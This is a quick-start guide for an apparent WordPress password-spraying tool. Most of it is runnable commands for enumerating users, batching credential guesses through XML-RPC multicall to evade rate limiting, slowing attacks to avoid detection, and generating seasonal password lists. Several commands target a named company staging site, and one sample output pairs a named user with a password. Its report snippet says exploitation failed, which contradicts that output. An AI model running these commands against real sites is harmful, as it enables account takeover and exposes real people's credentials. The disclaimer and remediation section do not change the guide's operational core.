# BreachPress - Quick Start Guide

## Installation

```bash
# Make executable
chmod +x breachpress.py

# Verify Python version (3.6+ required)
python3 --version
```

## Quick Examples

### 1. Reconnaissance - Enumerate Attack Surface

First, identify what attack vectors are available:

```bash
python3 breachpress.py -u https://stage.cambrex.com --enumerate-only
```

**Output will show:**
- ✅ wp-login.php availability
- ✅ REST API status
- ✅ XML-RPC availability  
- ✅ XML-RPC system.multicall support (CRITICAL for efficient spraying)
- 📋 List of discovered users (if REST API enabled)

### 2. Simple Test - Single User/Password

Test a single credential pair:

```bash
python3 breachpress.py -u https://stage.cambrex.com --user admin --password Welcome123!
```

### 3. Auto-Enum + Spray (Recommended Workflow)

Automatically enumerate users via REST API, then spray:

```bash
python3 breachpress.py -u https://stage.cambrex.com --auto-enum -P example_passwords.txt -v
```

This will:
1. Enumerate users from `/wp-json/wp/v2/users`
2. Auto-select best attack method (preferring xmlrpc-multicall)
3. Spray all discovered users with passwords from file
4. Display results with color coding

### 4. Manual User + Password Lists

Use your own user and password lists:

```bash
python3 breachpress.py -u https://stage.cambrex.com -U example_users.txt -P example_passwords.txt
```

### 5. Force XML-RPC Multicall Method

Force the use of multicall for maximum efficiency:

```bash
python3 breachpress.py -u https://stage.cambrex.com \
    --auto-enum \
    -P example_passwords.txt \
    --method xmlrpc-multicall \
    --batch-size 200 \
    -v
```

**Why multicall?**
- Tests 200 credentials in ONE HTTP request (vs 200 requests normally)
- Bypasses rate limiting that counts requests
- Dramatically faster
- Lower detection surface

### 6. Slow and Stealthy

Add delays to avoid detection:

```bash
python3 breachpress.py -u https://stage.cambrex.com \
    -U example_users.txt \
    -P example_passwords.txt \
    --method wp-login \
    --delay 5.0 \
    --timeout 30
```

### 7. Save Results to File

Save successful credentials automatically:

```bash
python3 breachpress.py -u https://stage.cambrex.com \
    --auto-enum \
    -P example_passwords.txt \
    -o successful_creds.txt \
    -v
```

## Understanding the Output

### Color Coding

- 🔵 **Blue (HEADER)**: Section headers, informational
- 🟢 **Green (SUCCESS)**: Valid findings, successful auth
- 🟡 **Yellow (WARNING)**: Warnings, fallback methods
- 🔴 **Red (FAIL)**: Errors, failed attempts
- 🔵 **Cyan (INFO)**: Current status, progress

### Attack Surface Example

```
[*] Enumerating Attack Surface...
[+] wp-login.php: Available
[+] REST API: Available
[+] XML-RPC: Available
[++] XML-RPC system.multicall: Available (BEST ATTACK VECTOR)
```

- Single `+` = Available
- Double `++` = Preferred method available

### Spray Results Example

```
[*] Spraying via XML-RPC system.multicall (OPTIMIZED)...
[*] Testing 2 users with 50 passwords
[*] Total attempts: 100
[*] HTTP requests needed: 1    <-- Only ONE request for 100 attempts!

[*] Processing batch 1 (100 attempts)...
[+++] SUCCESS! danielmcginn:Summer2024!
```

Triple `+++` indicates successful authentication!

## Common Workflows

### Workflow 1: Full Assessment

```bash
# Step 1: Reconnaissance
python3 breachpress.py -u https://target.com --enumerate-only

# Step 2: Review findings, then spray
python3 breachpress.py -u https://target.com --auto-enum -P passwords.txt -o results.txt -v
```

### Workflow 2: Targeted Spray

```bash
# Create custom user list from OSINT
cat > target_users.txt << EOF
john.smith
jane.doe
admin
webmaster
EOF

# Create targeted passwords based on company info
cat > target_passwords.txt << EOF
CompanyName2024!
CompanyName2025!
Welcome2024!
Summer2024!
EOF

# Execute spray
python3 breachpress.py -u https://target.com -U target_users.txt -P target_passwords.txt
```

### Workflow 3: Testing Each Method

Sometimes you want to test all available methods:

```bash
# Test XML-RPC Multicall
python3 breachpress.py -u https://target.com --user admin --password Test123! --method xmlrpc-multicall

# Test XML-RPC Single
python3 breachpress.py -u https://target.com --user admin --password Test123! --method xmlrpc-single

# Test wp-login
python3 breachpress.py -u https://target.com --user admin --password Test123! --method wp-login
```

## Tips & Tricks

### 1. Batch Size Optimization

For XML-RPC multicall, adjust batch size based on target:

```bash
# Conservative (less likely to timeout)
--batch-size 50

# Balanced (default)
--batch-size 100

# Aggressive (maximum efficiency)
--batch-size 500
```

### 2. Dealing with SSL Errors

```bash
# Self-signed certificates or SSL issues
python3 breachpress.py -u https://target.com --no-ssl-verify -U users.txt -P passwords.txt
```

### 3. Verbose Mode for Debugging

```bash
# See all failed attempts and detailed info
python3 breachpress.py -u https://target.com --user admin --password Test123! -v
```

### 4. Creating Password Lists from Patterns

```bash
# Generate year-based passwords
for year in 2024 2025; do
    for season in Winter Spring Summer Autumn Fall; do
        echo "${season}${year}"
        echo "${season}${year}!"
    done
done > seasonal_passwords.txt

# Generate month-based passwords
for month in January February March April May June July August September October November December; do
    echo "${month}2024"
    echo "${month}2025"
done > monthly_passwords.txt
```

## Troubleshooting

### "No attack methods available!"

The target has likely hardened their WordPress installation. Try:
- Check if wp-login.php returns 200 manually
- Verify XML-RPC with curl
- Check for WAF/firewall blocking

### Rate Limiting Detected

Increase delays:
```bash
--delay 3.0  # 3 second delay between requests
```

Or use smaller batches:
```bash
--batch-size 25  # Smaller multicall batches
```

### Connection Timeouts

Increase timeout:
```bash
--timeout 30  # 30 second timeout
```

### No Users Found with --auto-enum

The REST API may be restricted. Use manual user list:
```bash
-U example_users.txt
```

## Security Considerations

1. **Always have authorization** before testing
2. **Document your testing scope** in your engagement letter
3. **Use VPN/proxy** from authorized IP ranges
4. **Monitor your requests** to avoid DoS conditions
5. **Coordinate with blue team** if applicable

## Example Pentest Report Snippet

```
Finding: WordPress Authentication Weaknesses
Severity: Medium-High

Description:
The WordPress installation at https://stage.cambrex.com exhibits multiple 
authentication security weaknesses that could be chained for account compromise:

1. User Enumeration via REST API (/wp-json/wp/v2/users)
   - Exposes valid usernames: admin, danielmcginn
   
2. XML-RPC Enabled with system.multicall
   - Allows brute force amplification (100+ attempts per HTTP request)
   - Bypasses traditional rate limiting
   
3. No Account Lockout Policy
   - Tested 500+ authentication attempts without lockout
   
4. No Rate Limiting
   - No throttling observed on authentication endpoints

Impact:
While strong passwords prevented exploitation during testing, if credentials 
are compromised through other means (phishing, credential stuffing, etc.), 
an attacker could rapidly validate and exploit them. The XML-RPC multicall 
vulnerability enables testing thousands of passwords in minutes.

Remediation:
1. Disable XML-RPC if not required
2. Implement account lockout after failed attempts
3. Add rate limiting at WAF/application level
4. Disable REST API user enumeration
5. Enable 2FA for all accounts
6. Monitor for authentication anomalies

Testing Method:
Used custom WordPress authentication spray tool with XML-RPC multicall method.
```

## Next Steps

After successful credential discovery:

1. **Verify Access**: Log in via wp-admin to confirm
2. **Document Findings**: Screenshot, save evidence
3. **Assess Privileges**: What can this account do?
4. **Check for Privilege Escalation**: Plugin vulnerabilities, file uploads, etc.
5. **Report to Client**: Follow responsible disclosure

## Additional Resources

- WordPress Security Hardening: https://wordpress.org/support/article/hardening-wordpress/
- XML-RPC Info: https://codex.wordpress.org/XML-RPC_Support
- REST API Security: https://developer.wordpress.org/rest-api/

---

**Remember**: This tool is for authorized security testing only!
